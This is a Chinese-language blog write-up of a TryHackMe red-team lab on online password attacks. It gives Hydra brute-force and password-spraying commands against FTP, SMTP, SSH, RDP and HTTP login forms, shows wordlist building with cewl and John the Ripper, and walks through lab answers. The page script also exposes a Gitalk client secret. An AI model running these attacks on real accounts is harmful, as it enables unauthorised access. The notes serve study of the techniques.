+<p>-l ftp 我們正在指定一個單一的用戶名，使用 -L 指定用戶名詞表<br>-P 路徑 指定詞表的完整路徑，使用 -p 可以指定單一密碼。<br><a href="ftp://10.10.x.x/">ftp://10.10.x.x</a> 協議和目標的 IP 地址或完全合格的域名（FDQN）。<br>有時候你不需要進行暴力破解，可以先嘗試默認的憑證。嘗試攻擊附加虛擬機上的 FTP 服務器</p>
+</blockquote>
+<h3 id="Hydra破解SMTP伺服器"><a href="#Hydra破解SMTP伺服器" class="headerlink" title="Hydra破解SMTP伺服器"></a>Hydra破解SMTP伺服器</h3><h4 id="SMTP簡介"><a href="#SMTP簡介" class="headerlink" title="SMTP簡介"></a>SMTP簡介</h4><blockquote>
+<p>SMTP（Simple Mail Transfer Protocol，簡單郵件傳輸協議）是一種用於發送和轉發電子郵件的互聯網標準協議。</p>
+</blockquote>
+<ul>
+<li>電子郵件客戶端到伺服器：SMTP 用於管理從郵件客戶端（如 Outlook、Apple Mail 等）發送到郵件伺服器的郵件。</li>
+<li>伺服器到伺服器：在電子郵件的傳輸過程中，SMTP 負責處理從發送方郵件伺服器到接收方郵件伺服器的郵件轉發。</li>
+<li>發送大量電子郵件：企業和營銷活動常常通過 SMTP 伺服器發送大量推廣和通知郵件。</li>
+</ul>
+<h4 id="Hydra破解SMTP伺服器語法"><a href="#Hydra破解SMTP伺服器語法" class="headerlink" title="Hydra破解SMTP伺服器語法"></a>Hydra破解SMTP伺服器語法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>-v 選項代表「詳細模式」（verbose mode）。這意味著當命令執行時，Hydra 會顯示更詳細的輸出信息</p>
+</blockquote>
+<h3 id="Hydra破解SSH語法"><a href="#Hydra破解SSH語法" class="headerlink" title="Hydra破解SSH語法"></a>Hydra破解SSH語法</h3><h4 id="SSH簡介"><a href="#SSH簡介" class="headerlink" title="SSH簡介"></a>SSH簡介</h4><blockquote>
+<p>SSH（Secure Shell）是一種網絡協議，用於在不安全的網絡中安全地進行遠程登錄和其他網絡服務。SSH 提供了一個加密的通道，允許用戶安全地與遠程機器交換數據。這個協議主要用於遠程控制系統和管理服務器，同時也被用於在任何不安全的網絡中傳輸機密資料。</p>
+</blockquote>
+<ul>
+<li>加密連接：SSH 通過各種加密技術，如公鑰加密和對稱加密，來保護通過網絡傳輸的數據免遭竊聽和篡改。</li>
+<li>用戶身份驗證：SSH 支持多種身份驗證機制，包括密碼、公鑰和基於主機的身份驗證。</li>
+<li>數據完整性：SSH 使用消息認證碼（MAC）來確保數據在傳輸過程中未被篡改。</li>
+<li>端口轉發：SSH 允許端口轉發，通過這種方式，SSH 用戶可以安全地將網絡服務連接到遠程機器，或從遠程機器連接回本地機器。</li>
+<li>SFTP：SSH 文件傳輸協議（SFTP）是一種安全的文件傳輸協議，通過 SSH 通道提供文件訪問、文件傳輸和文件管理功能</li>
+</ul>
+<h4 id="Hydra破解SSH"><a href="#Hydra破解SSH" class="headerlink" title="Hydra破解SSH"></a>Hydra破解SSH</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v</span><br></pre></td></tr></table></figure>
+<h3 id="Hydra破解HTTP登陸頁面"><a href="#Hydra破解HTTP登陸頁面" class="headerlink" title="Hydra破解HTTP登陸頁面"></a>Hydra破解HTTP登陸頁面</h3><h4 id="破解前置流程"><a href="#破解前置流程" class="headerlink" title="破解前置流程"></a>破解前置流程</h4><blockquote>
+<p>在破解前，首先你需要了解你正在破解的內容。</p>
+</blockquote>
+<ul>
+<li>指定HTTP請求的類型，無論是 GET 還是 POST。<blockquote>
+<p>例如查看 Hydra 的選項http-get-form：</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra http-get-form -U</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Hydra 的選項http-get-form有以下語法：<br><url>:<form parameters>:<condition string>[:<optional>[:<optional>]]</p>
+</blockquote>
+</li>
+</ul>
+<blockquote>
+<p>&lt;url&gt;：<br>這是表單提交的 URL。它是攻擊目標表單的路徑，比如 <a href="http://example.com/login">http://example.com/login</a>.<br>&lt;form parameters&gt;：<br>這部分定義了表單中需要填寫的參數。格式通常為 username&#x3D;^USER^&amp;password&#x3D;^PASS^，其中 ^USER^ 和 ^PASS^ 是由 Hydra 替換的佔位符，分別代表用戶名和密碼的位置。<br>&lt;condition string&gt;：<br>這是用來判斷響應是否為成功登錄的條件。例如，如果登錄失敗頁面包含“錯誤”的文字，則條件字符串可能是 F&#x3D;錯誤；如果登錄成功，頁面可能會重定向或顯示某些特定文字，如 S&#x3D;歡迎.<br>[:&lt;optional&gt;]：<br>這是可選參數，可以根據需要添加。例如，指定使用的 HTTP 方法（GET 或 POST），或額外的 HTTP 標頭，或者對某些特定表單動作的特殊處理。<br>[:&lt;optional&gt;]：<br>第二個可選字段，可以用於提供更多的自定義選項，如 cookie 支持或其他自定義需求。</p>
+</blockquote>
+<blockquote>
+<p>我們需要分析我們需要發送的 HTTP 請求，這可以通過使用瀏覽器的開發者工具或使用 Web 代理，如 Burp Suite 來完成。</p>
+</blockquote>
+<h4 id="Hydra破解HTTP登陸頁面基本語法"><a href="#Hydra破解HTTP登陸頁面基本語法" class="headerlink" title="Hydra破解HTTP登陸頁面基本語法"></a>Hydra破解HTTP登陸頁面基本語法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form &quot;/login-get/index.php:username=^USER^&amp;password=^PASS^:S=logout.php&quot; -f </span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>-l admin 我們指定了一個單一的用戶名，使用 -L 指定用戶名詞表。</p>
+</blockquote>
+<blockquote>
+<p>-P 路徑 指定詞表的完整路徑，使用 -p 可以指定單一密碼。</p>
+</blockquote>
+<blockquote>
+<p>10.10.x.x 目標的 IP 地址或完全合格域名(要包含http:&#x2F;&#x2F;或https:&#x2F;&#x2F;)。</p>
+</blockquote>
+<blockquote>
+<p>http-get-form HTTP 請求的類型，可以是 http-get-form 或 http-post-form。</p>
+</blockquote>
+<blockquote>
+<p>login-get&#x2F;index.php 目標 Web 伺服器上的登錄頁面路徑。</p>
+</blockquote>
+<blockquote>
+<p>username&#x3D;^USER^&amp;password&#x3D;^PASS^ 要暴力破解的參數，我們注入 ^USER^ 來暴力破解用戶名，並使用 ^PASS^ 從指定的詞典中破解密碼。</p>
+</blockquote>
+<blockquote>
+<p>指定「失敗」條件 F&#x3D; 或成功條件 S&#x3D;。</p>
+</blockquote>
+<blockquote>
+<p>-f 在找到有效的用戶名和密碼後停止暴力破解攻擊。</p>
+</blockquote>
+<h4 id="其他在線密碼破解工具"><a href="#其他在線密碼破解工具" class="headerlink" title="其他在線密碼破解工具"></a>其他在線密碼破解工具</h4><ul>
+<li>Medusa</li>
+<li>Ncrack</li>
+<li>others!</li>
+</ul>
+<h4 id="小試身手-3"><a href="#小試身手-3" class="headerlink" title="小試身手"></a>小試身手</h4><p><img src="/photo/Red_Team_passwordarttack/27.jpg" alt="27"></p>
+<h5 id="第一題"><a href="#第一題" class="headerlink" title="第一題"></a>第一題</h5><blockquote>
+<p>利用ftp匿名登陸<br>用戶名:anonymous<br>密碼:直接按ENTER<br>尋找檔案，並下載</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.209.239</span><br><span class="line">anonymous</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">cd files</span><br><span class="line">ls</span><br><span class="line">get flag.txt 下載檔案</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>回主機查看flag.txt<br><img src="/photo/Red_Team_passwordarttack/20.jpg" alt="20"></p>
+</blockquote>
+<h5 id="第二題"><a href="#第二題" class="headerlink" title="第二題"></a>第二題</h5><blockquote>
+<p>用cewl從網站找出建立密碼字表</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>利用John the ripper將密碼依規則轉換<br>編寫規則</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /opt/john/john.conf</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>加入規則,並儲存</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Az&quot;[0-9][0-9]&quot;^[!@]</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>用規則加原本字典產生新的字典</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=clinic.lst --rules=tryhackme --stdout &gt;clinicN.lst</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>去除重複項</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort clinicN.lst |uniq -u&gt;clinicN1.lst</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>用新產生的字典進行攻擊</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -l pittman@clinic.thmredteam.com -P clinicN1.lst</span><br><span class="line">smtps://10.10.31.63:465 -v</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><img src="/photo/Red_Team_passwordarttack/21.jpg" alt="21"></p>
+</blockquote>
+<h5 id="第三題"><a href="#第三題" class="headerlink" title="第三題"></a>第三題</h5><p><img src="/photo/Red_Team_passwordarttack/22.jpg" alt="22"></p>
+<blockquote>
+<p>檢查帳號密碼是用什麼請求的<br><img src="/photo/Red_Team_passwordarttack/23.jpg" alt="23"><br>根據上圖很明顯是用get請求<br>用Burp Suite攔截請求查看<br><img src="/photo/Red_Team_passwordarttack/24.jpg" alt="24"><br>上圖使用者名稱在封包傳輸key是username，密碼在封包傳輸key是password</p>
+</blockquote>
+<blockquote>
+<p>開始破解</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l phillips -P clinicN.lst 10.10.53.138 http-get-form &quot;/login-get:username=^USER^&amp;password=^PASS^:F=Login failed!&quot; -f </span><br></pre></td></tr></table></figure>
+<h5 id="第四題"><a href="#第四題" class="headerlink" title="第四題"></a>第四題</h5><blockquote>
+<p>檢查帳號密碼是用什麼請求的<br>用Burp Suite攔截請求查看<br><img src="/photo/Red_Team_passwordarttack/25.jpg" alt="25"><br>根據上圖很明顯是用post請求<br>上圖使用者名稱在封包傳輸key是username，密碼在封包傳輸key是password</p>
+</blockquote>
+<blockquote>
+<p>製作規則字典</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=clinic.lst --rules=Single-Extra --stdout&gt;clinicNN.lst</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>開始破解</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -l burgess -P clinicNN.lst 10.10.219.153 http-post-form &quot;/login-post/index.php:username=^USER^&amp;password=^PASS^:S=logout.php&quot; -f</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/photo/Red_Team_passwordarttack/26.jpg" alt="26"></p>
+<h2 id="密碼噴射攻擊"><a href="#密碼噴射攻擊" class="headerlink" title="密碼噴射攻擊"></a>密碼噴射攻擊</h2><h3 id="簡介-5"><a href="#簡介-5" class="headerlink" title="簡介"></a>簡介</h3><blockquote>
+<p>密碼噴灑是一種有效的技術，用於識別有效的憑證。這種技術可以用於各種線上服務和身份驗證系統，如 SSH、SMB、RDP、SMTP、Outlook Web Application 等。暴力破解攻擊針對特定用戶名嘗試許多弱和可預測的密碼。而密碼噴灑攻擊則針對許多用戶名使用一個常見的弱密碼，這有助於避免帳戶鎖定政策。</p>
+</blockquote>
+<h3 id="SSH密碼噴射攻擊"><a href="#SSH密碼噴射攻擊" class="headerlink" title="SSH密碼噴射攻擊"></a>SSH密碼噴射攻擊</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10</span><br></pre></td></tr></table></figure>
+<h3 id="RDP密碼噴射攻擊"><a href="#RDP密碼噴射攻擊" class="headerlink" title="RDP密碼噴射攻擊"></a>RDP密碼噴射攻擊</h3><blockquote>
+<p>假設我們在端口3026上發現了一個暴露的RDP服務。我們可以使用RDPassSpray之類的工具對RDP進行密碼噴灑攻擊。</p>
+</blockquote>
+<h4 id="RDPassSpray"><a href="#RDPassSpray" class="headerlink" title="RDPassSpray"></a>RDPassSpray</h4><blockquote>
+<p>下載工具</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/xFreed0m/RDPassSpray.git</span><br><span class="line">sudo apt install python3-colorlog</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>查看使用方法及可用參數</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 RDPassSpray.py -h</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>基礎用法</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>RDP密碼噴射攻擊</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>如果我們處於 Active Directory 環境中，我們可以使用 -d 選項來指定域名。<br>-T 選項後跟包含 RDP 伺服器地址的文件路徑。這個文件應該列出了所有將被密碼噴灑攻擊的 RDP 伺服器的 IP 地址或主機名。</p>
+</blockquote>
+<h3 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h3><blockquote>
+<p>Outlook 网页访问（OWA）门户</p>
+</blockquote>
+<ul>
+<li>SprayingToolkit (atomizer.py)：一种用于进行密码喷射攻击的工具，特别针对如 OWA 这样的Web访问门户。</li>
+<li>MailSniper：一种专门用于针对 Microsoft Exchange 邮箱进行攻击的 PowerShell 脚本。<blockquote>
+<p>SMB（服务器消息块）</p>
+</blockquote>
+</li>
+<li>Metasploit (auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_login)：Metasploit 框架中的一个模块，用于对 SMB 服务进行密码喷射攻击。</li>
+</ul>
+<h3 id="小試身手-4"><a href="#小試身手-4" class="headerlink" title="小試身手"></a>小試身手</h3><blockquote>
+<p>創建密碼表</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for year in &#123;2020..2021&#125;; do for char in &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;$&#x27; &#x27;%&#x27; &#x27;^&#x27; &#x27;&amp;&#x27; &#x27;*&#x27; &#x27;(&#x27; &#x27;)&#x27;; do echo Fall$&#123;year&#125;$&#123;char&#125;; done; done &gt;RPDPASS.txt</span><br></pre></td></tr></table></figure>
+<ul>
+<li>for year in {2020..2021}; do：這是一個迴圈，會遍歷 2020 和 2021 這兩個年份。每次迴圈中，year 變量會被設置為這些年份之一。</li>
+<li>for char in ‘!’ ‘@’ ‘#’ ‘$’ ‘%’ ‘^’ ‘&amp;’ ‘*’ ‘(‘ ‘)’ ; do：這是另一個嵌套的迴圈，遍歷一組特殊字符。每次迴圈中，char 變量會被設置為這些特殊字符之一。</li>
+<li>echo Fall${year}${char};：這行命令會輸出一個字符串，開始於 “Fall”，然後是當前的年份（由外層迴圈的 year 變量提供），最後是當前的特殊字符（由內層迴圈的 char 變量提供）。</li>
+<li>done; done &gt;RPDPASS.txt：這裡的 done; done 表示兩個迴圈的結束。&gt;RPDPASS.txt 將所有的 echo 輸出重定向到名為 RPDPASS.txt 的文件中，如果文件已存在則覆蓋它。<blockquote>
+<p>開始破解</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L RDP.txt -P RPDPASS.txt ssh://10.10.235.158</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>用ssh連接</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh burgess@10.10.235.158</span><br><span class="line">Fall2021@</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>找出檔案並查看</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/</span><br><span class="line">cat flag</span><br></pre></td></tr></table></figure>
+<img src="/photo/Red_Team_passwordarttack/28.jpg" alt="28"></li>
+</ul>
+
+	  <div class="article-footer-copyright">
+    Zhi筆記部落格
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/04/25/Red-Team-Weaponization/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+		<section id="comments" class="comments">
+			<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalkConfig = {"enable":true,"clientID":"a5d7fbf7598366da6c6d","clientSecret":"55bbba32bf5c425d62e4562e6e0cdc1069f302ae","repo":"Zhi251.github.io","owner":"","admin":[""],"id":"location.pathname","distractionFreeMode":true};
+  var gitalk = new Gitalk(gitalkConfig);
+  gitalk.render('gitalk-container');
+</script>
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-04-29 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/紅隊密碼攻擊/">紅隊密碼攻擊<span>1</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/道德黑客/">道德黑客<span>4</span></a></li> <li><a href="/tags/自學/">自學<span>4</span></a></li> <li><a href="/tags/筆記/">筆記<span>6</span></a></li> <li><a href="/tags/紅隊/">紅隊<span>3</span></a></li> <li><a href="/tags/tryhackme/">tryhackme<span>3</span></a></li> <li><a href="/tags/攻擊階段-初訪問密碼攻擊/">攻擊階段-初訪問密碼攻擊<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%AF%86%E7%A2%BC%E6%94%BB%E6%93%8A"><span class="toc-article-text">密碼攻擊</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%AF%86%E7%A2%BC%E6%94%BB%E6%93%8A%E6%8A%80%E8%A1%93"><span class="toc-article-text">密碼攻擊技術</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%AF%86%E7%A2%BC%E5%88%86%E6%9E%90-1-%E9%A0%90%E8%A8%AD%E3%80%81%E5%BC%B1%E3%80%81%E6%B4%A9%E6%BC%8F%E3%80%81%E7%B5%84%E5%90%88%E5%92%8C%E7%94%A8%E6%88%B6%E5%90%8D%E5%96%AE%E5%AD%97%E5%88%97%E8%A1%A8"><span class="toc-article-text">密碼分析 1 -(預設、弱、洩漏、組合和用戶名單字列表)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%BB%98%E8%AA%8D%E9%A0%90%E8%A8%AD%E5%AF%86%E7%A2%BC"><span class="toc-article-text">默認預設密碼</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%8F%83%E8%80%83%E7%B6%B2%E7%AB%99"><span class="toc-article-text">參考網站</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%BC%B1%E5%AF%86%E7%A0%81"><span class="toc-article-text">弱密码</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%8F%83%E8%80%83%E7%B6%B2%E7%AB%99-1"><span class="toc-article-text">參考網站</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%B4%A9%E6%BC%8F%E5%AF%86%E7%A2%BC"><span class="toc-article-text">洩漏密碼</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%8F%83%E8%80%83%E7%B6%B2%E5%9D%80"><span class="toc-article-text">參考網址</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%95%B4%E7%90%86%E5%AF%86%E7%A2%BC%E5%88%97%E8%A1%A8"><span class="toc-article-text">整理密碼列表</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%90%88%E4%BD%B5%E5%AF%86%E7%A2%BC%E5%88%97%E8%A1%A8"><span class="toc-article-text">合併密碼列表</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%A7%BB%E9%99%A4%E9%87%8D%E8%A4%87%E7%9A%84%E5%AF%86%E7%A2%BC"><span class="toc-article-text">移除重複的密碼</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AE%9A%E8%A3%BD%E5%AD%97%E5%85%B8"><span class="toc-article-text">定製字典</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%B7%A5%E5%85%B7-cewl"><span class="toc-article-text">工具:cewl</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%94%A8%E6%88%B6%E5%90%8D%E5%AD%97%E5%85%B8"><span class="toc-article-text">用戶名字典</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%B7%A5%E5%85%B7-username-generator%E4%B8%8B%E8%BC%89%E7%B6%B2%E5%9D%80"><span class="toc-article-text">工具:username_generator下載網址</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%AF%84%E4%BE%8B"><span class="toc-article-text">範例</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%AF%86%E7%A2%BC%E5%88%86%E6%9E%90-2-%E9%8D%B5%E7%A9%BA%E9%96%93%E6%8A%80%E8%A1%93%E5%92%8C-CUPP"><span class="toc-article-text">密碼分析 2 -(鍵空間技術和 CUPP)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%8D%B5%E7%A9%BA%E9%97%B4%E6%8A%80%E8%A1%93"><span class="toc-article-text">鍵空间技術</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%B0%A1%E4%BB%8B"><span class="toc-article-text">簡介</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%8D%B5%E7%A9%BA%E9%96%93%E6%8A%80%E8%A1%93%E5%84%AA%E7%BC%BA%E9%BB%9E"><span class="toc-article-text">鍵空間技術優缺點</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%8D%B5%E7%A9%BA%E9%97%B4%E6%8A%80%E8%A1%93%E6%87%89%E7%94%A8-crunch"><span class="toc-article-text">鍵空间技術應用(crunch)</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CUPP"><span class="toc-article-text">CUPP</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%B0%A1%E4%BB%8B-1"><span class="toc-article-text">簡介</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%B6%B2%E5%9D%80"><span class="toc-article-text">網址</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%A4%BA%E7%AF%84"><span class="toc-article-text">示範</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%B0%8F%E8%A9%A6%E8%BA%AB%E6%89%8B"><span class="toc-article-text">小試身手</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E9%9B%A2%E7%B7%9A%E6%94%BB%E6%93%8A-%E5%AD%97%E5%85%B8%E5%92%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-article-text">離線攻擊 -(字典和暴力破解)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AD%97%E5%85%B8%E6%94%BB%E6%93%8A"><span class="toc-article-text">字典攻擊</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%B0%A1%E4%BB%8B-2"><span class="toc-article-text">簡介</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%A4%BA%E7%AF%84-%E5%AD%97%E5%85%B8%E6%94%BB%E6%93%8Ahash-identifier-hashcat"><span class="toc-article-text">示範(字典攻擊hash-identifier&amp;hashcat)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#hash-identifier"><span class="toc-article-text">hash-identifier</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#hashcat"><span class="toc-article-text">hashcat</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E6%93%8A"><span class="toc-article-text">暴力破解攻擊</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%B0%A1%E4%BB%8B-3"><span class="toc-article-text">簡介</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E6%93%8A-hashcat"><span class="toc-article-text">暴力破解攻擊(hashcat)</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%A4%BA%E7%AF%84-%E6%9A%B4%E5%8A%9B%E6%94%BB%E6%93%8Ahashcat"><span class="toc-article-text">示範(暴力攻擊hashcat)</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%B0%8F%E8%A9%A6%E8%BA%AB%E6%89%8B-1"><span class="toc-article-text">小試身手</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E9%9B%A2%E7%B7%9A%E6%94%BB%E6%93%8A-%E5%9F%BA%E6%96%BC%E8%A6%8F%E5%89%87%E7%9A%84"><span class="toc-article-text">離線攻擊 -(基於規則的)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%B0%A1%E4%BB%8B-4"><span class="toc-article-text">簡介</span></a></li><li class="toc-article-item 